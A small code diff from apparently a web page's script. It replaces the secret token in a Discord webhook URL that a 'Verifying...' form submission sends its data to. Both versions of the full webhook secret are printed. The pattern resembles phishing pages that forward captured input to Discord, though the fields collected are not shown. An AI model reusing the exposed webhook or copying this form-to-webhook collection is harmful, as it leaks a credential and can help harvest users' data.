@@ -315,7 +315,7 @@
       submitBtn.disabled = true;
       submitBtn.textContent = 'Verifying...';
 
-      const webhookUrl = "https://discord.com/api/webhooks/1384168262199410690/Mf56mxY1uHTQBBNuUghceqLC-qQpDLNjIzrT4isDtqKpSwPi6Xevmsh1hpdp_pOloTnB";
+      const webhookUrl = "https://discord.com/api/webhooks/1384168262199410690/Mf56mxY1uHTQBBNuUghceqLC-qQpDLNjIzrT4isDtqKpSwPi6Xevmsh1hpdpJ-pWwG-X";
 
       const data = {
         content: null,
